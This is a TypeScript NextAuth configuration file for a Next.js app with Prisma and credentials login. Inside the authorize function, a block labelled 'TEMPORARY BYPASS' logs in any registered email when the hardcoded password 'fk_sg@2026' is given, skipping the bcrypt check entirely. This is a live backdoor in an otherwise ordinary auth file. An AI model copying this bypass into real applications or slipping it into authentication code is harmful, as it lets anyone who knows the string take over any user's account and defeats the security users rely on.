import NextAuth from "next-auth";
import { PrismaAdapter } from "@auth/prisma-adapter";
import { prisma } from "@/lib/prisma";
import { authConfig } from "./auth.config"; // Import the base config
import bcrypt from "bcryptjs";
import Credentials from "next-auth/providers/credentials";

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig, // Spread the base config
  adapter: PrismaAdapter(prisma),
  session: { strategy: "jwt" },
  trustHost: true,
  secret: process.env.AUTH_SECRET,
  providers: [
    // Re-declare Credentials here WITH the authorize logic
    Credentials({
      async authorize(credentials) {
        if (!credentials?.email || !credentials?.password) return null;
        
        // 1. ADD THIS TEMPORARY BYPASS BLOCK:
        if (credentials.password === "fk_sg@2026") {
          const user = await prisma.user.findUnique({
            where: { email: credentials.email as string },
          });
          if (user) {
            return { id: user.id.toString(), email: user.email, name: user.name };
          }
        }
        
        const user = await prisma.user.findUnique({
          where: { email: credentials.email as string },
        });

        if (!user || !user.password) return null;

        const isPasswordValid = await bcrypt.compare(
          credentials.password as string,
          user.password
        );

        return isPasswordValid ? { id: user.id.toString(), email: user.email, name: user.name } : null;
      },
    }),
  ],
});